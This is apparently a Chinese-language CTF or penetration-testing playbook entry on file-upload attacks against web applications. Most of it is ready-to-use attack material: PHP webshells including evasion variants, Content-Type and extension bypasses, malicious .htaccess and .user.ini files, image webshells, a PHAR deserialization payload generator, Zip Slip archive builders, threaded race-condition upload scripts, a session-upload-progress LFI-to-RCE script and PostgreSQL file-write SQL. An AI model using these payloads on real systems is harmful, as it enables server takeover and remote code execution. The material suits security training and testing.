---
category: web
tags: [file_upload, webshell, 文件上传, 上传绕过, content_type_bypass, extension_bypass, htaccess, user_ini, image_webshell, 图片马, phar_deserialization, phar反序列化, zip_slip, path_traversal, race_condition, 竞争条件, double_extension, 双扩展名, null_byte, 截断, upload_progress, 临时文件]
triggers: [file upload, upload, 上传, 文件上传, multipart, "Content-Type", webshell, ".php", ".phtml", ".phar", ".htaccess", ".user.ini", "move_uploaded_file", "tmp_name", upload_progress, 图片马, image shell, phar://, zip slip, getimagesize, exif_imagetype, mime_content_type, finfo_file]
related: [lfi, command_injection, deserialization_pickle, race_condition]
---

# 文件上传 (File Upload)

## 什么时候用

目标 Web 应用存在文件上传功能（头像、附件、导入等），可以尝试上传恶意文件获取 RCE 或进一步利用。

## 前提条件

- 存在文件上传入口（表单、API 端点、WebDAV PUT）
- 上传后的文件可被 Web 服务器直接访问，或可通过 LFI/SSRF 等方式触发
- 服务器端对上传内容的校验存在可绕过的缺陷

## 攻击步骤

### 1. Content-Type 绕过

服务器仅校验 HTTP 请求中的 `Content-Type` 头，不检查文件真实内容。

```python
import requests

url = "http://target/upload"
files = {
    'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/png')
}
r = requests.post(url, files=files)
print(r.text)
```

常用合法 MIME 类型替换：`image/png`, `image/jpeg`, `image/gif`, `application/pdf`

### 2. 扩展名绕过

#### 2.1 替代扩展名

PHP 可解析的扩展名：

```
.php .php3 .php4 .php5 .php7 .pht .phtml .phar .phps .pgif .inc
```

ASP/ASPX：`.asp .aspx .ashx .asmx .cer .asa`

JSP：`.jsp .jspx .jsw .jsv .jspf`

#### 2.2 双扩展名 / 多扩展名

Apache 在某些配置下会从右到左解析，最终匹配到可执行扩展名：

```
shell.php.jpg       ← Apache 可能仍当 PHP 执行
shell.php.xxx       ← 未知扩展名 fallback
shell.php%00.jpg    ← 旧版 PHP NULL 字节截断（PHP < 5.3.4）
shell.php\x00.jpg   ← URL 编码变体
```

#### 2.3 大小写混合

```
shell.pHp  shell.PhP  shell.PHP
```

#### 2.4 上传 .htaccess（Apache）

若目标允许上传到 Web 目录且 Apache 启用了 `AllowOverride`：

```bash
# 先上传 .htaccess
echo 'AddType application/x-httpd-php .jpg' > .htaccess
# 再上传 shell.jpg，Apache 会按 PHP 执行
```

进阶 `.htaccess`：
```apache
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

#### 2.5 上传 .user.ini（PHP-FPM + Nginx）

比 `.htaccess` 更隐蔽，只要目录下有 `.php` 文件即可生效（5 分钟刷新周期）：

```ini
auto_prepend_file=shell.jpg
```

上传此 `.user.ini` + 含 PHP 代码的 `shell.jpg`，访问同目录的任意 `.php` 文件即触发。

### 3. Webshell 上传

**最小 PHP webshell**：
```php
<?=`$_GET[0]`?>
```

**经典一句话**：
```php
<?php @eval($_POST['cmd']); ?>
```

**免杀变形**：
```php
<?php $a='sys'.'tem'; $a($_GET['c']); ?>
```

```php
<?php preg_replace('/.*/e', $_POST['c'], ''); ?>
```

### 4. 图片马（Image Webshell）

绕过 `getimagesize()`、`exif_imagetype()`、`finfo_file()` 等文件头校验。

**GIF 图片马**：
```bash
# GIF 头 + PHP 代码
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.gif
```

**JPEG 图片马**：
```bash
# 在真实图片的 EXIF Comment 里注入
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg
mv legit.jpg shell.php.jpg
```

**PNG 图片马**（利用 IDAT chunk 注入）：
```bash
# 方法：将 PHP 代码放到合法 PNG 的非关键 chunk（如 tEXt）中
python3 -c "
import struct, zlib
header = b'\x89PNG\r\n\x1a\n'
ihdr = b'\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde'
php = b'<?php system(\$_GET[\"c\"]); ?>'
text_chunk = b'tEXt' + b'Comment\x00' + php
text_len = struct.pack('>I', len(text_chunk) - 4)
text_crc = struct.pack('>I', zlib.crc32(text_chunk) & 0xFFFFFFFF)
print('使用 exiftool 方式更可靠')
"
```

⚠️ 图片马本身不会被执行，需要配合 LFI 包含或 `.htaccess`/`.user.ini` 等手段触发解析。

### 5. PHAR 反序列化

PHAR 文件的 metadata 以 PHP 序列化格式存储。当代码通过 `phar://` 协议访问 PHAR 文件时，metadata 被自动反序列化——即使调用的是 `file_exists()`、`filesize()`、`fopen()`、`md5_file()` 等不执行代码的函数。

**触发函数清单**（不完整）：
```
file_get_contents()  fopen()  file()  file_exists()  md5_file()
filemtime()  filesize()  is_file()  is_dir()  copy()  rename()
```

**生成恶意 PHAR**：
```php
<?php
class VulnClass {
    public $cmd = 'id';
    function __destruct() { system($this->cmd); }
}

$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
// JPG 魔数头绕过上传检测
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new VulnClass());
$phar->stopBuffering();
// php --define phar.readonly=0 create_phar.php
?>
```

**触发**：让目标代码对上传的 PHAR 文件执行 `phar://` 协议调用：
```
http://target/vuln.php?file=phar://uploads/evil.jpg
```

⚠️ 需要目标代码中存在可利用的 `__destruct()` / `__wakeup()` 魔术方法的类（gadget chain）。

### 6. ZIP/TAR 解压路径穿越（Zip Slip）

上传 ZIP/TAR 文件，若服务器直接解压且未过滤路径中的 `../`：

```python
import zipfile, io

z = zipfile.ZipFile('evil.zip', 'w')
z.writestr('../../var/www/html/shell.php', '<?php system($_GET["c"]); ?>')
z.close()
```

```python
import tarfile, io

with tarfile.open('evil.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='../../var/www/html/shell.php')
    payload = b'<?php system($_GET["c"]); ?>'
    info.size = len(payload)
    tar.addfile(info, io.BytesIO(payload))
```

### 7. 文件名截断

#### NULL 字节截断（PHP < 5.3.4）

```
shell.php%00.jpg → 服务器保存为 shell.php
```

#### 超长文件名截断

某些文件系统/框架对文件名有长度限制（如 255 字节），可构造：
```
aaaa...aaa.php.jpg   (总长 255，.jpg 被截断)
```

### 8. 竞争条件上传（Race Condition）

#### 8.1 上传后删除竞争

服务器先保存文件再校验→校验失败后删除，在这个窗口内访问：

```python
import threading, requests

def upload():
    while True:
        files = {'file': ('shell.php', '<?php system("id > /tmp/pwned"); ?>')}
        requests.post("http://target/upload", files=files)

def trigger():
    while True:
        requests.get("http://target/uploads/shell.php")

for _ in range(10):
    threading.Thread(target=upload).start()
    threading.Thread(target=trigger).start()
```

#### 8.2 PHP_SESSION_UPLOAD_PROGRESS 竞争

无需真正的上传功能。当 `session.upload_progress.enabled=On` 时，PHP 会将上传进度写入 session 文件，配合 LFI 包含 session 文件实现 RCE。

**原理**：`PHP_SESSION_UPLOAD_PROGRESS` 字段值被写入 `/var/lib/php/sessions/sess_<PHPSESSID>`，但 `session.upload_progress.cleanup=On`（默认）会在上传完成后立即清理——需要竞争。

```python
import requests, threading

url = "http://target/index.php"
sess_name = "evilsess"
lfi_url = f"{url}?page=/var/lib/php/sessions/sess_{sess_name}"

def upload_progress():
    while True:
        data = {
            'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("id"); ?>'
        }
        files = {'file': ('dummy.txt', b'A' * 1024 * 50)}
        cookies = {'PHPSESSID': sess_name}
        requests.post(url, data=data, files=files, cookies=cookies)

def include_session():
    while True:
        r = requests.get(lfi_url, cookies={'PHPSESSID': sess_name})
        if "uid=" in r.text:
            print("[+] RCE!", r.text)
            return

for _ in range(10):
    threading.Thread(target=upload_progress).start()
    threading.Thread(target=include_session).start()
```

**去除 `upload_progress_` 前缀的技巧**（Orange Tsai 方法）：将 payload 做 3 次 base64 编码，通过 `php://filter/convert.base64-decode` 过滤器链解码，base64 解码时自动忽略非法字符（即前缀）。

#### 8.3 PHP 临时文件竞争

PHP 接收上传文件时创建临时文件（`/tmp/phpXXXXXX`），脚本执行完毕后自动删除。

- **Windows**：临时文件名模式 `C:\Windows\Temp\php<uuuu>.TMP`，仅 16-bit 随机，可暴力枚举。配合 `FindFirstFile` 通配符 `php<<` 加速：
  ```
  http://target/vuln.php?inc=C:\Windows\Temp\php<<
  ```
- **Linux**：6 字符随机（`/tmp/phpXXXXXX`），不可暴力。需配合 `/proc/self/fd/<N>` 或 `phpinfo()` 泄露文件名。

### 9. PostgreSQL Large Object 写文件

通过 SQL 注入在 PostgreSQL 中利用 Large Object 写入任意文件：

```sql
-- 创建 Large Object
SELECT lo_creat(-1);  -- 返回 LOID，如 173454

-- 分块写入（每块 2KB）
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<base64_chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<base64_chunk2>', 'base64'));

-- 导出到服务器文件系统
SELECT lo_export(173454, '/var/www/html/shell.php');
SELECT lo_unlink(173454);
```

本地分块准备：
```bash
split -b 2048 shell.php           # 分割为 2KB 块
base64 -w 0 xaa                   # 每块 base64 编码
```

⚠️ Large Object 可能有 ACL 限制，需要足够的数据库权限。

## 常见坑

- **只校验前端**：JS 验证可以直接 Burp 改包绕过，先检查服务端有无二次校验
- **白名单 vs 黑名单**：白名单比黑名单难绕，遇到白名单优先考虑 `.htaccess` / `.user.ini` / 图片马 + LFI 组合
- **上传路径未知**：响应中没有返回路径时，尝试常见路径（`/uploads/`, `/upload/`, `/static/`）或利用目录遍历/报错信息泄露
- **文件重命名**：服务器对上传文件做了随机重命名（UUID），无法直接猜测路径。考虑：ZIP 解压穿越、PHAR 反序列化、或结合信息泄露
- **二次渲染**：GD/ImageMagick 二次渲染会清除图片中注入的代码，需要在渲染不会破坏的位置注入（IDAT chunk for PNG）
- **PHAR 需要 gadget chain**：有 PHAR 上传不等于有 RCE，必须存在可利用的 `__destruct()` / `__wakeup()` 类
- **`.user.ini` 生效延迟**：默认 5 分钟（`user_ini.cache_ttl`），上传后等一会再触发
- **竞争条件窗口极小**：上传竞争需要高并发多线程反复尝试，单次成功率低

## 变体

| 变体 | 场景 | 关键点 |
|------|------|--------|
| 头像/图片上传 | 社交/CMS 平台 | 图片马 + LFI 或 `.htaccess` |
| 文档导入 | Office/PDF/CSV 导入功能 | XXE（XLSX/DOCX 的 XML）、公式注入 |
| 压缩包上传 | 支持 ZIP/TAR 上传并自动解压 | Zip Slip 路径穿越 |
| 模板/插件上传 | CMS 主题/插件上传 | 直接上传含后门的插件包 |
| API 文件上传 | REST/GraphQL 的 multipart 端点 | 缺少 content-type 或扩展名校验 |
| WebDAV PUT | 启用了 WebDAV 的服务器 | 直接 PUT 一个 webshell |
| ImageMagick 处理 | 上传后经过 ImageMagick 处理 | ImageTragick (CVE-2016-3714) |

## 相关技术

- [[lfi]] — 文件上传后通过 LFI 包含触发执行（图片马、session 文件、临时文件）
- [[command_injection]] — 文件名可能被拼入系统命令（如 `convert` 处理图片时）
- [[deserialization_pickle]] — 类似 PHAR 的反序列化利用思路（Python 版本）
